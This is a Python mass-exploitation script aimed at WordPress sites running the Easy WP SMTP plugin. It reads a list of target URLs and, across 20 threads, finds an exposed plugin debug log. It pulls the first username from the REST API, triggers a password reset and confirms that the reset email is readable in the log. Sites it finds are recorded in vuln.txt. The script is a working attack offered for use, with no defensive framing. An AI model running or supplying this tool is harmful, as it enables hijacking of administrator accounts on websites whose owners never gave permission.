import re
import time
import urllib3
import requests
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'wordpress_test_cookie=WP+Cookie+check; humans_21909=1;'}

def reset_password(url, debug_name, username):
    print('reset_password() Caleed. - {}'.format(url))
    r = requests.get(f'{url}/wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headers)
    print('FIRST REQuEST : {} - {}'.format(r.status_code, url))
    if r.status_code == 200:
        data = {'user_login': username, 'redirect_to': '', 'wp-submit': 'Get+New+Password'}
        r = requests.post(f'{url}/wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headers, data=data)
        time.sleep(0.5)
        r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/{debug_name}', verify=False, timeout=10, allow_redirects=False, headers=headers)
        if r.status_code == 200 and f'login={username}' in r.text:
            with open(f'vuln.txt', 'a+') as output:
                output.write(f'EASY SMTP VULN : {r.url}\n')


def getUser(url, debug_name):
    r = requests.get(f'{url}/wp-json/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headers)
    if r.status_code == 200:
        if 'slug' in r.text:
            slug = r.json()[0]['slug']
            reset_password(url, debug_name, slug)
    if r.status_code != 200:
        r = requests.get(f'{url}/?rest_route=/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headers)
        if r.status_code == 200:
            if 'slug' in r.text:
                slug = r.json()[0]['slug']
                reset_password(url, debug_name, slug)
                print(f'METHOD TWO: {slug}')

def checksmtp(url):
    r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/readme.txt', verify=False, timeout=10, allow_redirects=False, headers=headers)
    if r.status_code == 200:
        if 'Easy WP SMTP' in r.text and '= 1.4.3 =' not in r.text:
            r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/', verify=False, timeout=10, allow_redirects=False, headers=headers)
            if r.status_code == 200:
                if 'Index of' in r.text and 'debug_log.txt' in r.text:
                    r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                    find_debug = re.findall('<a href="(.*?)_debug_log.txt', r.text)[0].strip('/wp-content/plugins/easy-wp-smtp/')
                    if find_debug:
                        r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/{find_debug}_debug_log.txt', verify=False, timeout=10, allow_redirects=False, headers=headers)
                        if r.status_code == 200:
                            if 'SMTP Error:' not in r.text:
                                debug_name = f'{find_debug}_debug_log.txt'
                                getUser(url, debug_name)
                    else:
                        pass
                else:
                    pass

def verifyURL(url):
    r = requests.get(f'http://{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
    if r.status_code == 200:
        checksmtp(r.url.strip('/'))
    if r.status_code == 301:
        r = requests.get(f'{r.headers["Location"]}', verify=False, timeout=10, allow_redirects=False, headers=headers)
        if r.status_code == 200:
            checksmtp(r.url.strip('/'))
        else:
            r = requests.get(f'http://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
            if r.status_code == 200:
                checksmtp(r.url.strip('/'))
            else:
                r = requests.get(f'https://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                if r.status_code == 200:
                    checksmtp(r.url.strip('/'))

if __name__ == "__main__":
    inpFile = input("Enter your url list : ")
    threads = []
    with open(inpFile) as urlList:
        argFile = urlList.read().splitlines()
    with ThreadPoolExecutor(max_workers=20) as executor:
        for data in argFile:
            threads.append(executor.submit(verifyURL, data))
